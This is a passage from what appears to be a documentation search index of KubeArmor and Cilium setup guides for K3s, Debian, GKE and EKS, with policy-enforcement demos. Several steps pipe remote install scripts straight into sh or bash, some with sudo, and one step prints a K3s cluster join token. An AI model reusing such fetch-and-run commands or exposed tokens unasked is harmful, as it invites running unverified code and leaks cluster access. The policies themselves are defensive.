~/.kube/config nano ~/.kube/config Change the Server: 127.0.0.1 to 192.168.56.41 kubectl get nodes Login in to Ubuntuvm2 vagrant ssh ubuntuvm2 ip a show curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = \"--node-ip=192.168.56.42 --flannel-iface=eth1\" K3S_URL = \"https://192.168.56.41:6443\" K3S_TOKEN = \"K107b9ecf5076c2a0c79760aa0e545d7464f11bbd27c643b1f1b8eef34758af1b89::server:985d51052287fd7554e989bd742c7f31\" sh - Note: IP & Token may change exit kubectl get nodes","title":"Step 4: Install K3's on Ubuntuvm"},{"location":"open-source/k3s/k3s/#step-5-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 5: Karmor Install"},{"location":"open-source/k3s/k3s/#step-6-cilium-install","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble","title":"Step 6: Cilium Install"},{"location":"open-source/k3s/k3s/#step-7-kubearmor-policy","text":"1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml kubectl get ksp Note: Policy will work based on matched lables Ex: (app: nginx) 4. Violating the policy kubectl exec -it nginx-766b69bd4b-8jttd -- bash Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 Verifying policy Violation logs karmor log","title":"Step 7: Kubearmor Policy"},{"location":"open-source/k3s/k3s/#step-8-cilium-policy","text":"1. Create a tightfighter & deathstart deployment nano tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy nano sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get cnp 4. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye Cilium SVC port forward to Monitor the logs cilium hubble port-forward","title":"Step 8: Cilium Policy"},{"location":"open-source/k3s/k3s/#step-9-install-the-hubble-cli-client","text":"exportHUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 9: Install the Hubble CLI Client"},{"location":"open-source/k3s/k3s/#step-10-monitoring-the-cilium-voilation-logs","text":"hubble observe -f --protocol http --pod tiefighter","title":"Step 10: Monitoring the Cilium voilation logs"},{"location":"open-source/kubearmor/bullseye/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads. Step 1: Install Kubearmor on VM \u00b6 sudo apt install bpfcc-tools linux-headers- $( uname -r ) Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command. $apt --fix-broken install to fix the error & reinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 2: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm --kvms policy add khp-example-vmname.yaml Step 3: Policy Violation \u00b6 With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"Debian 11 (Bullseye)"},{"location":"open-source/kubearmor/bullseye/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/kubearmor/bullseye/#step-1-install-kubearmor-on-vm","text":"sudo apt install bpfcc-tools linux-headers- $( uname -r ) Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command. $apt --fix-broken install to fix the error & reinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 1: Install Kubearmor on VM"},{"location":"open-source/kubearmor/bullseye/#step-2-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm --kvms policy add khp-example-vmname.yaml","title":"Step 2: Apply and Verify Kubearmor system policy"},{"location":"open-source/kubearmor/bullseye/#step-3-policy-violation","text":"With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"Step 3: Policy Violation"},{"location":"open-source/kubearmor/buster/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads. Step 1: Install Kubearmor on VM \u00b6 Install pre-requisites: Repositories: /etc/apt/sources.list should include the non-free repository and look something like this: vi /etc/apt/sources.list Add the following: deb http://deb.debian.org/debian sid main contrib non-free deb-src http://deb.debian.org/debian sid main contrib non-free Install Build dependencies: apt-get update According to debian.org sudo apt-get install arping bison clang-format cmake dh-python \\ dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\ libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\ libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\ luajit python3-netaddr python3-pyroute2 python3-distutils python3 Install and Compile BCC: git clone https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build sudo make install cmake .. make Install linux-headers: sudo apt install linux-headers- $( uname -r ) Note: If youre getting this following error, Follow this steps to slove the error. sudo make install apt install gcc-8 sudo apt install linux-headers- $( uname -r ) Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command to fix the error. apt --fix-broken install dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 2: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : /usr/bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml Step 3: Policy Violation \u00b6 sleep 10 Verifying policy Violation logs: karmor log","title":"Debian 10 (Buster)"},{"location":"open-source/kubearmor/buster/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/kubearmor/buster/#step-1-install-kubearmor-on-vm","text":"Install pre-requisites: Repositories: /etc/apt/sources.list should include the non-free repository and look something like this: vi /etc/apt/sources.list Add the following: deb http://deb.debian.org/debian sid main contrib non-free deb-src http://deb.debian.org/debian sid main contrib non-free Install Build dependencies: apt-get update According to debian.org sudo apt-get install arping bison clang-format cmake dh-python \\ dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\ libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\ libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\ luajit python3-netaddr python3-pyroute2 python3-distutils python3 Install and Compile BCC: git clone https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build sudo make install cmake .. make Install linux-headers: sudo apt install linux-headers- $( uname -r ) Note: If youre getting this following error, Follow this steps to slove the error. sudo make install apt install gcc-8 sudo apt install linux-headers- $( uname -r ) Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command to fix the error. apt --fix-broken install dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 1: Install Kubearmor on VM"},{"location":"open-source/kubearmor/buster/#step-2-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : /usr/bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml","title":"Step 2: Apply and Verify Kubearmor system policy"},{"location":"open-source/kubearmor/buster/#step-3-policy-violation","text":"sleep 10 Verifying policy Violation logs: karmor log","title":"Step 3: Policy Violation"},{"location":"open-source/kubearmor/cos/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on GKE with COS and Ubuntu by applying policies on Kubernetes workloads. Step 1: Install Daemonsets & Services \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components. Step 2: Verify the Installation \u00b6 Kubectl get pods -A Step 3: Install sample K8's Application \u00b6 kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Step 4: Verify the Installation \u00b6 kubectl get pods -n wordpress-mysql Step 5: Get Auto discovered policies \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash Step 6: Applying Auto discovered policies on Cluster \u00b6 These policies can then be applied on the k8s cluster running KubeArmor . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Kubearmor policy: kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"GKE with COS and Ubuntu"},{"location":"open-source/kubearmor/cos/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on GKE with COS and Ubuntu by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/kubearmor/cos/#step-1-install-daemonsets-services","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components.","title":"Step 1: Install Daemonsets &amp; Services"},{"location":"open-source/kubearmor/cos/#step-2-verify-the-installation","text":"Kubectl get pods -A","title":"Step 2: Verify the Installation"},{"location":"open-source/kubearmor/cos/#step-3-install-sample-k8s-application","text":"kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 3: Install sample K8's Application"},{"location":"open-source/kubearmor/cos/#step-4-verify-the-installation","text":"kubectl get pods -n wordpress-mysql","title":"Step 4: Verify the Installation"},{"location":"open-source/kubearmor/cos/#step-5-get-auto-discovered-policies","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash","title":"Step 5: Get Auto discovered policies"},{"location":"open-source/kubearmor/cos/#step-6-applying-auto-discovered-policies-on-cluster","text":"These policies can then be applied on the k8s cluster running KubeArmor . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Kubearmor policy: kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 6: Applying Auto discovered policies on Cluster"},{"location":"open-source/kubearmor/eks/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads. Step 1: Create a EKS Cluster \u00b6 Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster Step 2: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor version karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 3: Kubearmor Policy \u00b6 1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched lables. Ex: (app: nginx) 4. Policy violation kubectl exec -it nginx-766b69bd4b-8jttd -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log","title":"EKS Ubuntu Server 20.04"},{"location":"open-source/kubearmor/eks/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/kubearmor/eks/#step-1-create-a-eks-cluster","text":"Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster","title":"Step 1: Create a EKS Cluster"},{"location":"open-source/kubearmor/eks/#step-2-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor version karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Karmor Install"},{"location":"open-source/kubearmor/eks/#step-3-kubearmor-policy","text":"1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched lables. Ex: (app: nginx) 4. Policy violation kubectl exec -it nginx-766b69bd4b-8jttd -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log","title":"Step 3: Kubearmor Policy"},{"location":"open-source/kubearmor/k3s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on K3's by applying policies on Kubernetes workloads. Step 1: Install K3's on Linux \u00b6 curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 export KUBECONFIG = /etc/rancher/k3s/k3s.yaml cp /etc/rancher/k3s/k3s.yaml ~/.kube/config systemctl status k3s which kubectl ; kubectl get nodes Step 2: Install Karmor \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor verify kubectl get pods -n kube-system | grep kubearmor Step 3: Kubearmor Policy - Audit \u00b6 3.1 Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 1. Process Level \u00b6 vim nginx-kubearmor-ppolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-pa # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Audit Apply the policy kubectl apply -f nginx-kubearmor-ppolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 2. File Level \u00b6 vim nginx-kubearmor-fpolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-fa # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Audit Apply the policy kubectl apply -f nginx-kubearmor-fpolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Directory Level \u00b6 vim nginx-kubearmor-dpolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-da # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Audit Apply the policy kubectl apply -f nginx-kubearmor-dpolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log Step 4: Kubearmor Policy - Block \u00b6 1. Process Level \u00b6 vim nginx-kubearmor-ppolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-pb # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Block Apply the policy kubectl apply -f nginx-kubearmor-ppolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 2. File Level \u00b6 vim nginx-kubearmor-fpolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-fb # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Block Apply the policy kubectl apply -f nginx-kubearmor-fpolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Directory Level \u00b6 vim nginx-kubearmor-dpolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-db # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Block Apply the policy kubectl apply -f nginx-kubearmor-dpolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"K3's Cluster"},{"location":"open-source/kubearmor/k3s/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on K3's by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/kubearmor/k3s/#step-1-install-k3s-on-linux","text":"curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 export KUBECONFIG = /etc/rancher/k3s/k3s.yaml cp /etc/rancher/k3s/k3s.yaml ~/.kube/config systemctl status k3s which kubectl ; kubectl get nodes","title":"Step 1: Install K3's on Linux"},{"location":"open-source/kubearmor/k3s/#step-2-install-karmor","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor verify kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Install Karmor"},{"location":"open-source/kubearmor/k3s/#step-3-kubearmor-policy-audit","text":"3.1 Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels","title":"Step 3: Kubearmor Policy - Audit"},{"location":"open-source/kubearmor/k3s/#1-process-level","text":"vim nginx-kubearmor-ppolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-pa # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Audit Apply the policy kubectl apply -f nginx-kubearmor-ppolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"1. Process Level"},{"location":"open-source/kubearmor/k3s/#2-file-level","text":"vim nginx-kubearmor-fpolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-fa # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Audit Apply the policy kubectl apply -f nginx-kubearmor-fpolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"2. File Level"},{"location":"open-source/kubearmor/k3s/#3-directory-level","text":"vim nginx-kubearmor-dpolicy-a.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-da # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Audit Apply the policy kubectl apply -f nginx-kubearmor-dpolicy-a.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"3. Directory Level"},{"location":"open-source/kubearmor/k3s/#step-4-kubearmor-policy-block","text":"","title":"Step 4: Kubearmor Policy - Block"},{"location":"open-source/kubearmor/k3s/#1-process-level_1","text":"vim nginx-kubearmor-ppolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-pb # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Block Apply the policy kubectl apply -f nginx-kubearmor-ppolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"1. Process Level"},{"location":"open-source/kubearmor/k3s/#2-file-level_1","text":"vim nginx-kubearmor-fpolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-fb # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Block Apply the policy kubectl apply -f nginx-kubearmor-fpolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"2. File Level"},{"location":"open-source/kubearmor/k3s/#3-directory-level_1","text":"vim nginx-kubearmor-dpolicy-b.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy-db # namespace: k3-test # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Block Apply the policy kubectl apply -f nginx-kubearmor-dpolicy-b.yaml kubectl get ksp Note: Policy will work based on matched labels Ex: (app: nginx) Violating the Policy kubectl exec -it nginx-8f458dc5b-shshr -- bash Policy violation logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log","title":"3. Directory Level"},{"location":"open-source/kubearmor/microk8s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on MicroK8's by applying policies on Kubernetes workloads. Step 1: Setup MicroK8's \u00b6 Clone the Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's 